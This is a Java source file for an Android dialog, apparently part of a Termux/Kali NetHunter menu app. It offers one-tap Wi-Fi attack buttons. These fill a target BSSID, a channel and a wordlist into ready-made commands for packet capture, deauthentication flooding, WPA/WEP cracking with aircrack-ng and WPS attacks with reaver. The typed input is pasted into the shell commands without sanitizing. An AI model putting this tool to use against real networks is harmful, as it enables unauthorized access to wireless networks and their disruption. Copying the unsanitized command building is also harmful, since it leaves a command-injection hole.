package com.termux.menu.ui.dialog;

import android.app.Dialog;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import com.termux.menu.termux.TermuxCommandHelper;

/** WiFi工具集 — 扫描/破解/欺骗 (Kali环境) */
public class WiFiToolsDialog extends Dialog {
    private Context mContext;
    private TermuxCommandHelper mCmdHelper;
    private EditText mBssidEdit, mChannelEdit, mWordlistEdit, mInterfaceEdit;

    public WiFiToolsDialog(Context context) {
        super(context);
        mContext = context;
        mCmdHelper = TermuxCommandHelper.getInstance(context);
        init();
    }

    private void init() {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        setCancelable(true);
        ScrollView scroll = new ScrollView(mContext);
        LinearLayout root = new LinearLayout(mContext);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF161823);
        root.setPadding(dp(20), dp(16), dp(20), dp(16));

        addTitle(root, "WiFi 工具集 (Kali)");

        root.addView(label("无线网卡接口:"));
        mInterfaceEdit = editText("wlan0");
        root.addView(mInterfaceEdit);

        root.addView(label("目标BSSID:"));
        mBssidEdit = editText("");
        mBssidEdit.setHint("例如: AA:BB:CC:DD:EE:FF");
        root.addView(mBssidEdit);

        root.addView(label("信道:"));
        mChannelEdit = editText("");
        mChannelEdit.setHint("例如: 6");
        root.addView(mChannelEdit);

        root.addView(label("字典路径:"));
        mWordlistEdit = editText("/usr/share/wordlists/rockyou.txt.gz");
        root.addView(mWordlistEdit);

        // 工具按钮网格
        String[][] tools = {
            {"WiFi扫描", "nethunter -r airodump-ng "},
            {"抓包", "nethunter -r airodump-ng -c {ch} --bssid {bssid} -w /tmp/cap {iface}"},
            {"Deauth攻击", "nethunter -r aireplay-ng -0 10 -a {bssid} {iface}"},
            {"WPA破解", "nethunter -r aircrack-ng -w {wordlist} -b {bssid} /tmp/cap*.cap"},
            {"WPS攻击", "nethunter -r reaver -i {iface} -b {bssid} -vv"},
            {"WEP破解", "nethunter -r aircrack-ng -b {bssid} /tmp/cap*.cap"},
            {"监控模式", "nethunter -r airmon-ng start {iface}"},
            {"停止监控", "nethunter -r airmon-ng stop {iface}mon"},
        };

        LinearLayout grid = new LinearLayout(mContext);
        grid.setOrientation(LinearLayout.VERTICAL);
        for (int i = 0; i < tools.length; i += 2) {
            LinearLayout row = new LinearLayout(mContext);
            row.setOrientation(LinearLayout.HORIZONTAL);
            for (int j = 0; j < 2 && (i+j) < tools.length; j++) {
                final String label = tools[i+j][0];
                final String cmd = tools[i+j][1];
                Button btn = new Button(mContext);
                btn.setText(label); btn.setTextColor(0xFFFFFFFF);
                btn.setTextSize(12); btn.setPadding(dp(8),dp(8),dp(8),dp(8));
                btn.setBackgroundColor(0xFF37474F);
                btn.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
                    String c = cmd.replace("{iface}", mInterfaceEdit.getText().toString().trim())
                        .replace("{bssid}", mBssidEdit.getText().toString().trim())
                        .replace("{ch}", mChannelEdit.getText().toString().trim())
                        .replace("{wordlist}", mWordlistEdit.getText().toString().trim());
                    mCmdHelper.sendCommandToTerminal(c);
                    Toast.makeText(mContext, "已发送: " + label, Toast.LENGTH_SHORT).show();
                    dismiss();
                }});
                LinearLayout.LayoutParams bp = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1);
                bp.rightMargin = j == 0 ? dp(4) : 0; bp.bottomMargin = dp(4);
                btn.setLayoutParams(bp); row.addView(btn);
            }
            grid.addView(row);
        }
        root.addView(grid);

        // 一键脚本
        TextView note = new TextView(mContext);
        note.setText("提示: 需要Kali Nethunter + 支持监控模式的无线网卡");
        note.setTextColor(0xFF888888); note.setTextSize(11); note.setPadding(0, dp(12), 0, 0);
        root.addView(note);

        scroll.addView(root); setContentView(scroll);
        Window w = getWindow();
        if (w != null) { w.setGravity(Gravity.BOTTOM);
            w.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, (int)(mContext.getResources().getDisplayMetrics().heightPixels*0.8));
            w.setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) w.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
            else w.setType(WindowManager.LayoutParams.TYPE_PHONE);
        }
    }

    private void addTitle(LinearLayout r, String t) { TextView tv = new TextView(mContext); tv.setText(t); tv.setTextColor(0xFFFFFFFF); tv.setTextSize(18); tv.setPadding(0,0,0,dp(12)); r.addView(tv); }
    private TextView label(String t) { TextView tv = new TextView(mContext); tv.setText(t); tv.setTextColor(0xFFBBBBBB); tv.setTextSize(13); tv.setPadding(0,dp(10),0,dp(4)); return tv; }
    private EditText editText(String d) { EditText et = new EditText(mContext); et.setText(d); et.setTextColor(0xFFFFFFFF); et.setHintTextColor(0xFF888888); et.setBackgroundColor(0x22FFFFFF); et.setPadding(dp(12),dp(8),dp(12),dp(8)); et.setSingleLine(true); et.setTextSize(14); return et; }
    private int dp(int v) { return (int)(v * mContext.getResources().getDisplayMetrics().density + 0.5f); }
}
